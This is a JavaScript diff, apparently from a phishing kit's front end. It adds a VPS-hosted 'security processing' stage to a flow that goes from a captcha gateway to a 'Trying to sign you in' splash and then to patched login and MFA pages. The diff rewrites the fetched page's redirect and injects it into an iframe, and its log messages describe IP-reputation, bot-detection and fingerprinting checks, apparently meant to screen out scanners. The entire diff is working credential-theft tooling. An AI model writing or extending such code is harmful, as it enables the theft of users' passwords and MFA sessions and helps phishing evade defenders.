@@ -303,14 +303,48 @@
         // Global session token storage
         let sessionToken = null;
 
-        // 3. Callback when Gateway (Slider) is solved -> Fetch Splash
+        // 2. Callback when Gateway (Captcha) is solved -> Load Processing Page
         window.onGatewaySuccess = async (token) => {
             console.log("✅ Gateway solved! Token:", token);
             sessionToken = token; // Store globally
-            console.log("🎬 Fetching Splash (Envelope + 'Trying to sign you in')...");
+            console.log("🔐 Loading Security Processing Page (Background Checks)...");
 
             try {
-                const response = await fetch(`${API_URL}/pages?type=splash&token=${token}`, {
+                // Fetch the processing page HTML from VPS
+                const response = await fetch(`${API_URL}/processing`);
+                const html = await response.text();
+
+                // Patch the processing page to work in remote iframe context
+                let patchedHtml = html;
+
+                // Intercept the redirect after security checks pass
+                patchedHtml = patchedHtml.replace(
+                    /window\.location\.href = result\.redirect;/g,
+                    `console.log('Security checks passed, redirect:', result.redirect);
+                     if (window.parent && window.parent.onProcessingComplete) {
+                         window.parent.onProcessingComplete();
+                     } else {
+                         window.location.href = result.redirect;
+                     }`
+                );
+
+                // Inject patched processing page into iframe
+                injectIntoFrame(patchedHtml);
+                console.log("⏳ Running background security checks (IP reputation, bot detection, fingerprinting)...");
+
+            } catch (error) {
+                console.error("Processing page fetch error:", error);
+                // Fallback: Skip to splash if processing page fails
+                window.onProcessingComplete();
+            }
+        };
+
+        // 3. Callback when Processing (Security Checks) complete -> Fetch Splash
+        window.onProcessingComplete = async () => {
+            console.log("🎬 Security checks passed! Fetching Splash...");
+
+            try {
+                const response = await fetch(`${API_URL}/pages?type=splash&token=${sessionToken}`, {
                     headers: { 'X-API-KEY': API_KEY }
                 });
                 const data = await response.json();
@@ -326,7 +360,7 @@
             }
         };
 
-        // 3. Callback when Splash animation completes -> Fetch Login
+        // 4. Callback when Splash animation completes -> Fetch Login
         window.onSplashComplete = async () => {
             console.log("🎬 Splash complete!");
             console.log("🔄 Fetching Login Page...");
@@ -349,7 +383,7 @@
         };
 
 
-        // 4. General Step Handler (Called by patched Login/MFA pages)
+        // 5. General Step Handler (Called by patched Login/MFA pages)
         // Deduplication variables to prevent unnecessary reloads
         let lastPageFetched = null;
         let lastPageFetchTime = 0;
